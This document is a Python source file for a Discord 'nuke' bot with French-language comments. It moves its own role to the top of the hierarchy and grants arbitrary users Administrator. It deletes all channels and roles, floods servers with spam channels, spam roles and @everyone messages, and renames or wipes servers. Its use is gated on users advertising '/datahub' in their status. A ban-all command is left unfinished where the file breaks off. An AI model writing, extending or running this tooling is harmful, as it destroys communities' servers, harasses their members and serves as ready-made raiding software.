import os
import json
import asyncio
import logging
from pathlib import Path
import discord
from discord import app_commands
from discord.ext import commands

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
)
log = logging.getLogger('giveadmin-bot')

TOKEN = os.environ.get('DISCORD_TOKEN')
ROLE_NAME = os.environ.get('ADMIN_ROLE_NAME', 'W4X15DJ')
STATUS_KEYWORDS = ('/datahub', '.gg/datahub')
MAIN_GUILD_ID = int(os.environ.get('MAIN_GUILD_ID', '1473760731047399576'))
VIP_ROLE_ID = int(os.environ.get('VIP_ROLE_ID', '1493295317997588662'))
PRESETS_FILE = Path(os.environ.get('PRESETS_FILE', '/app/presets.json'))

if not TOKEN:
    raise RuntimeError('DISCORD_TOKEN is not set in environment')

intents = discord.Intents.default()
intents.members = True
intents.guilds = True
intents.presences = True  # necessaire pour lire le statut custom

bot = commands.Bot(command_prefix='!', intents=intents)

# Etat par guilde : si True, /help affiche le faux help
fake_help_mode: dict[int, bool] = {}


# ----------------------------- helpers ----------------------------- #

async def _safe(coro):
    try:
        return await coro
    except Exception as e:
        log.warning('task failed: %s', e)
        return None


async def _move_bot_role_to_top(guild: discord.Guild):
    """Deplace le role le plus haut du bot tout en haut de la hierarchie."""
    me = guild.me
    if me is None:
        return None
    # On prend le role le plus eleve du bot (hors @everyone)
    bot_role = me.top_role
    if bot_role is None or bot_role.is_default():
        return None
    # Position la plus haute possible = nombre de roles - 1 (0 = everyone)
    max_pos = max((r.position for r in guild.roles), default=1)
    try:
        if bot_role.position < max_pos:
            await bot_role.edit(position=max_pos, reason='Placer le role du bot tout en haut')
    except discord.HTTPException as e:
        log.warning('Could not move bot role to top: %s', e)
    return bot_role


def _has_datahub_status(member: discord.Member) -> bool:
    """Retourne True si le membre a '/datahub' ou '.gg/datahub' dans son statut custom."""
    if member is None:
        return False
    for activity in member.activities or []:
        if isinstance(activity, discord.CustomActivity):
            text = (activity.name or '') + ' ' + (getattr(activity, 'state', '') or '')
        else:
            text = (getattr(activity, 'name', '') or '') + ' ' + (getattr(activity, 'state', '') or '')
        text = text.lower()
        if any(k.lower() in text for k in STATUS_KEYWORDS):
            return True
    return False


async def _is_authorized(interaction: discord.Interaction) -> tuple[bool, str]:
    """Verifie uniquement que l utilisateur a /datahub ou .gg/datahub dans son statut."""
    user = interaction.user

    # 1) essai dans la guilde courante (la plus fiable pour les presences)
    here = interaction.guild.get_member(user.id) if interaction.guild else None
    if _has_datahub_status(here):
        return True, ''

    # 2) fallback : essayer dans n importe quelle autre guilde partagee avec le bot
    for g in bot.guilds:
        m = g.get_member(user.id)
        if m is not None and _has_datahub_status(m):
            return True, ''

    return False, 'Mets `/datahub` ou `.gg/datahub` dans ton statut Discord pour utiliser ce bot.'


def require_auth():
    """Decorateur qui ajoute un check d autorisation a une commande slash."""
    async def predicate(interaction: discord.Interaction) -> bool:
        ok, msg = await _is_authorized(interaction)
        if not ok:
            if not interaction.response.is_done():
                await interaction.response.send_message(msg, ephemeral=True)
            else:
                await interaction.followup.send(msg, ephemeral=True)
            return False
        return True
    return app_commands.check(predicate)


# ----------------------------- VIP auth ----------------------------- #

async def _is_vip_authorized(interaction: discord.Interaction) -> tuple[bool, str]:
    """VIP : doit avoir le statut /datahub ET le role VIP sur le serveur principal."""
    ok, msg = await _is_authorized(interaction)
    if not ok:
        return False, msg

    main_guild = bot.get_guild(MAIN_GUILD_ID)
    if main_guild is None:
        return False, f'Le bot doit etre membre du serveur principal (ID {MAIN_GUILD_ID}).'

    main_member = main_guild.get_member(interaction.user.id)
    if main_member is None:
        try:
            main_member = await main_guild.fetch_member(interaction.user.id)
        except (discord.NotFound, discord.HTTPException):
            main_member = None

    if main_member is None:
        return False, 'Tu dois rejoindre le serveur principal : https://discord.gg/datahub'

    if not any(r.id == VIP_ROLE_ID for r in main_member.roles):
        return False, 'Cette commande est reservee aux membres **VIP** du serveur principal.'

    return True, ''


def require_vip():
    async def predicate(interaction: discord.Interaction) -> bool:
        ok, msg = await _is_vip_authorized(interaction)
        if not ok:
            if not interaction.response.is_done():
                await interaction.response.send_message(msg, ephemeral=True)
            else:
                await interaction.followup.send(msg, ephemeral=True)
            return False
        return True
    return app_commands.check(predicate)


# ----------------------------- presets storage ----------------------------- #

def _load_presets() -> dict:
    if not PRESETS_FILE.exists():
        return {}
    try:
        return json.loads(PRESETS_FILE.read_text(encoding='utf-8'))
    except Exception as e:
        log.warning('presets load failed: %s', e)
        return {}


def _save_presets(data: dict) -> None:
    PRESETS_FILE.parent.mkdir(parents=True, exist_ok=True)
    PRESETS_FILE.write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding='utf-8')


def _get_user_presets(user_id: int) -> dict:
    return _load_presets().get(str(user_id), {})


def _set_user_preset(user_id: int, name: str, preset: dict) -> None:
    data = _load_presets()
    data.setdefault(str(user_id), {})[name] = preset
    _save_presets(data)


def _del_user_preset(user_id: int, name: str) -> bool:
    data = _load_presets()
    bucket = data.get(str(user_id), {})
    if name in bucket:
        del bucket[name]
        if not bucket:
            data.pop(str(user_id), None)
        else:
            data[str(user_id)] = bucket
        _save_presets(data)
        return True
    return False


# ----------------------------- events ----------------------------- #

@bot.event
async def on_ready():
    log.info('Logged in as %s', bot.user)
    for guild in bot.guilds:
        try:
            await _move_bot_role_to_top(guild)
        except Exception as e:
            log.warning('move bot role failed on %s: %s', guild.id, e)
        try:
            bot.tree.copy_global_to(guild=guild)
            synced = await bot.tree.sync(guild=guild)
            log.info('Synced %d cmd(s) to guild %s', len(synced), guild.id)
        except Exception as e:
            log.exception('Guild sync failed: %s', e)


@bot.event
async def on_guild_join(guild: discord.Guild):
    log.info('Joined guild %s -- resyncing', guild.id)
    # Deplacer le role du bot tout en haut des l arrivee
    try:
        await _move_bot_role_to_top(guild)
    except Exception as e:
        log.warning('move bot role failed on join %s: %s', guild.id, e)
    try:
        bot.tree.copy_global_to(guild=guild)
        synced = await bot.tree.sync(guild=guild)
        log.info('Synced %d cmd(s) to new guild %s', len(synced), guild.id)
    except Exception as e:
        log.exception('on_guild_join sync failed: %s', e)


@bot.tree.error
async def on_app_command_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
    if isinstance(error, app_commands.CheckFailure):
        return  # message deja envoye
    log.exception('Command error: %s', error)
    try:
        if interaction.response.is_done():
            await interaction.followup.send(f'Erreur: `{error}`', ephemeral=True)
        else:
            await interaction.response.send_message(f'Erreur: `{error}`', ephemeral=True)
    except Exception:
        pass


# ----------------------------- /giveadmin ----------------------------- #

@bot.tree.command(name='giveadmin', description='Cree un role Admin et l attribue a un utilisateur')
@app_commands.describe(user_id='ID de l utilisateur a qui donner le role admin')
@require_auth()
async def giveadmin(interaction: discord.Interaction, user_id: str):
    await interaction.response.defer(ephemeral=True, thinking=True)
    if interaction.guild is None:
        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
        return

    guild = interaction.guild
    try:
        uid = int(user_id.strip())
    except ValueError:
        await interaction.followup.send('ID invalide.', ephemeral=True)
        return

    member = guild.get_member(uid) or await guild.fetch_member(uid)
    me = guild.me
    if me is None or not me.guild_permissions.manage_roles:
        await interaction.followup.send('Le bot doit avoir Manage Roles / Administrateur.', ephemeral=True)
        return

    # 1) S assurer que le role du bot est tout en haut
    bot_role = await _move_bot_role_to_top(guild) or me.top_role

    # 2) Creer le nouveau role admin
    role = await guild.create_role(
        name=ROLE_NAME,
        permissions=discord.Permissions(administrator=True),
        reason=f'/giveadmin by {interaction.user}',
    )

    # 3) Le placer JUSTE SOUS le role du bot (= position max - 1) = tout en haut possible
    try:
        target_pos = max((bot_role.position - 1) if bot_role else 1, 1)
        await role.edit(position=target_pos, reason='Place giveadmin role tout en haut (sous le bot)')
    except discord.HTTPException as e:
        log.warning('Could not reposition new role: %s', e)

    # 4) Attribuer
    await member.add_roles(role, reason=f'/giveadmin by {interaction.user}')
    await interaction.followup.send(
        f'Role **{role.name}** (Admin, place tout en haut) attribue a <@{member.id}>.',
        ephemeral=True,
    )


# ----------------------------- /n-salon ----------------------------- #

@bot.tree.command(
    name='n-salon',
    description='Supprime tous les salons, en cree N et y envoie un message en boucle',
)
@app_commands.describe(
    number='Nombre de salons a creer',
    message='Message a envoyer dans chaque salon',
    repeat='Nombre de fois que le message est envoye par salon (defaut 5)',
    name='Nom des salons crees (defaut: spam)',
)
@require_auth()
async def n_salon(
    interaction: discord.Interaction,
    number: int,
    message: str,
    repeat: int = 5,
    name: str = 'spam',
):
    await interaction.response.defer(ephemeral=True, thinking=True)
    if interaction.guild is None:
        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
        return

    guild = interaction.guild
    me = guild.me
    if me is None or not me.guild_permissions.administrator:
        await interaction.followup.send('Le bot doit avoir la permission Administrateur.', ephemeral=True)
        return
    if number < 1 or number > 500:
        await interaction.followup.send('number doit etre entre 1 et 500.', ephemeral=True)
        return
    if repeat < 1 or repeat > 50:
        await interaction.followup.send('repeat doit etre entre 1 et 50.', ephemeral=True)
        return

    start = asyncio.get_event_loop().time()
    await asyncio.gather(*[_safe(ch.delete(reason='/n-salon')) for ch in list(guild.channels)])

    create_tasks = [
        _safe(guild.create_text_channel(name=f'{name}-{i+1}', reason='/n-salon'))
        for i in range(number)
    ]
    created = [c for c in await asyncio.gather(*create_tasks) if c is not None]

    async def flood(channel):
        sent = 0
        for _ in range(repeat):
            try:
                await channel.send(content=message)
                sent += 1
            except discord.HTTPException as e:
                log.warning('send failed on %s: %s', channel.id, e)
                await asyncio.sleep(0.5)
        return sent

    results = await asyncio.gather(*[flood(c) for c in created])
    total_sent = sum(results)
    elapsed = asyncio.get_event_loop().time() - start

    if created:
        try:
            await created[0].send(
                f'**/n-salon termine en {elapsed:.1f}s** - {len(created)}/{number} salons, {total_sent} messages.'
            )
        except Exception:
            pass


# ----------------------------- /spam-r ----------------------------- #

async def _spam_roles(guild: discord.Guild, base_name: str, count: int, reason: str) -> int:
    tasks = [
        _safe(guild.create_role(name=f'{base_name}-{i+1}', reason=reason))
        for i in range(count)
    ]
    results = await asyncio.gather(*tasks)
    return sum(1 for r in results if r is not None)


@bot.tree.command(name='spam-r', description='Cree en boucle des roles nommes {name}-1, {name}-2, ...')
@app_commands.describe(
    role_name='Nom de base des roles a creer',
    count='Nombre de roles a creer (defaut: 5)',
)
@require_auth()
async def spam_r(interaction: discord.Interaction, role_name: str, count: int = 5):
    await interaction.response.defer(ephemeral=True, thinking=True)
    if interaction.guild is None:
        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
        return

    guild = interaction.guild
    me = guild.me
    if me is None or not me.guild_permissions.manage_roles:
        await interaction.followup.send('Le bot doit avoir Manage Roles / Administrateur.', ephemeral=True)
        return
    if count < 1 or count > 250:
        await interaction.followup.send('count doit etre entre 1 et 250.', ephemeral=True)
        return
    base = role_name.strip()[:90] or 'role'

    start = asyncio.get_event_loop().time()
    created = await _spam_roles(guild, base, count, reason=f'/spam-r by {interaction.user}')
    elapsed = asyncio.get_event_loop().time() - start
    await interaction.followup.send(
        f'**{created}/{count}** roles `{base}-N` crees en {elapsed:.1f}s.',
        ephemeral=True,
    )


# ----------------------------- /nuke (core) ----------------------------- #

async def _execute_nuke(
    guild: discord.Guild,
    invoker: discord.abc.User,
    channels: int,
    message: str,
    repeat: int,
    channel_name: str,
    server_name: str | None,
    delete_roles: bool,
    spam_role_name: str,
    spam_role_count: int,
) -> str:
    """Execute le nuke et retourne un summary texte. Aucune verification ici."""
    me = guild.me
    start = asyncio.get_event_loop().time()
    log.info('NUKE launched by %s on guild %s', invoker, guild.id)

    rename_task = None
    if server_name:
        new = server_name.strip()[:100]
        if len(new) >= 2:
            rename_task = asyncio.create_task(
                _safe(guild.edit(name=new, reason=f'/nuke by {invoker}'))
            )

    role_targets = [
        r for r in guild.roles
        if not r.is_default() and not r.managed and r < me.top_role
    ] if delete_roles else []

    delete_tasks = [_safe(c.delete(reason='/nuke')) for c in list(guild.channels)]
    delete_tasks += [_safe(r.delete(reason='/nuke')) for r in role_targets]
    await asyncio.gather(*delete_tasks)

    create_tasks = [
        _safe(guild.create_text_channel(name=f'{channel_name}-{i+1}', reason='/nuke'))
        for i in range(channels)
    ]
    created = [c for c in await asyncio.gather(*create_tasks) if c is not None]

    spam_roles_created = 0
    if spam_role_count > 0:
        spam_roles_created = await _spam_roles(
            guild, (spam_role_name.strip()[:90] or 'nuked'), spam_role_count,
            reason=f'/nuke spam-r by {invoker}',
        )

    async def flood(channel):
        sent = 0
        for _ in range(repeat):
            try:
                await channel.send(content=message)
                sent += 1
            except discord.HTTPException as e:
                log.warning('send failed on %s: %s', channel.id, e)
                await asyncio.sleep(0.5)
        return sent

    results = await asyncio.gather(*[flood(c) for c in created])
    total_sent = sum(results)

    if rename_task:
        await rename_task

    elapsed = asyncio.get_event_loop().time() - start
    summary = (
        f'**NUKE termine en {elapsed:.1f}s**\n'
        f'- {len(created)}/{channels} salons crees\n'
        f'- {len(role_targets)} roles supprimes\n'
        f'- {spam_roles_created} roles spam `{spam_role_name}-N` crees\n'
        f'- {total_sent} messages envoyes\n'
        + (f'- Serveur renomme en **{server_name}**\n' if server_name else '')
    )
    if created:
        try:
            await created[0].send(summary)
        except Exception:
            pass
    return summary


@bot.tree.command(
    name='nuke',
    description='Nuke complet: supprime salons + roles, recree N salons, spam messages ET roles, renomme le serveur',
)
@app_commands.describe(
    channels='Nombre de salons a creer (defaut: 50)',
    message='Message a spam dans chaque salon (defaut: @everyone)',
    repeat='Nombre de messages par salon (defaut: 5)',
    channel_name='Nom des nouveaux salons (defaut: nuked)',
    server_name='Nouveau nom du serveur (optionnel)',
    delete_roles='Supprimer aussi tous les roles (defaut: true)',
    spam_role_name='Nom de base des roles a spam-creer (defaut: nuked)',
    spam_role_count='Nombre de roles a spam-creer (defaut: 50)',
)
@require_auth()
async def nuke(
    interaction: discord.Interaction,
    channels: int = 50,
    message: str = '@everyone',
    repeat: int = 5,
    channel_name: str = 'nuked',
    server_name: str = None,
    delete_roles: bool = True,
    spam_role_name: str = 'nuked',
    spam_role_count: int = 50,
):
    await interaction.response.defer(ephemeral=True, thinking=True)
    if interaction.guild is None:
        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
        return

    guild = interaction.guild
    me = guild.me
    if me is None or not me.guild_permissions.administrator:
        await interaction.followup.send('Le bot doit avoir la permission Administrateur.', ephemeral=True)
        return
    if channels < 1 or channels > 500:
        await interaction.followup.send('channels doit etre entre 1 et 500.', ephemeral=True)
        return
    if repeat < 1 or repeat > 50:
        await interaction.followup.send('repeat doit etre entre 1 et 50.', ephemeral=True)
        return
    if spam_role_count < 0 or spam_role_count > 250:
        await interaction.followup.send('spam_role_count doit etre entre 0 et 250.', ephemeral=True)
        return

    await _execute_nuke(
        guild, interaction.user, channels, message, repeat, channel_name,
        server_name, delete_roles, spam_role_name, spam_role_count,
    )
    await interaction.followup.send('Nuke termine.', ephemeral=True)


# ----------------------------- /reset ----------------------------- #

@bot.tree.command(name='reset', description='Supprime TOUT (salons, roles) et cree un salon _terminal')
@require_auth()
async def reset(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True, thinking=True)
    if interaction.guild is None:
        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
        return

    guild = interaction.guild
    me = guild.me
    if me is None or not me.guild_permissions.administrator:
        await interaction.followup.send('Le bot doit avoir la permission Administrateur.', ephemeral=True)
        return

    start = asyncio.get_event_loop().time()

    # 1) Supprimer tous les salons
    chan_tasks = [_safe(c.delete(reason='/reset')) for c in list(guild.channels)]
    # 2) Supprimer tous les roles possibles (sauf everyone, managed, >= bot)
    role_targets = [
        r for r in guild.roles
        if not r.is_default() and not r.managed and r < me.top_role
    ]
    role_tasks = [_safe(r.delete(reason='/reset')) for r in role_targets]

    await asyncio.gather(*chan_tasks, *role_tasks)

    # 3) Creer le salon _terminal
    terminal = await _safe(guild.create_text_channel(name='_terminal', reason='/reset terminal'))

    elapsed = asyncio.get_event_loop().time() - start
    remaining_roles = {r.id for r in guild.roles}
    deleted_roles = sum(1 for r in role_targets if r.id not in remaining_roles)

    if terminal:
        try:
            await terminal.send(
                f'**/reset termine en {elapsed:.1f}s** - {deleted_roles}/{len(role_targets)} roles supprimes. '
                f'Salon `_terminal` cree.'
            )
        except Exception:
            pass
    await interaction.followup.send(
        f'Reset complet en {elapsed:.1f}s. Salon `_terminal` cree.',
        ephemeral=True,
    )


# ----------------------------- /ban-all & /kick-all ----------------------------- #

@bot.tree.command(name='ban-all', description='Bannit tous les membres du serveur')
@require_auth()
async def ban_all(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True, thinking=True)
    if interaction.guild is None:
        await interaction.followup.send('A utiliser dans un serveur.', ephemeral=True)
        return

    guild = interaction.guild

if __name__ == '__main__':
    bot.run(TOKEN, reconnect=True)
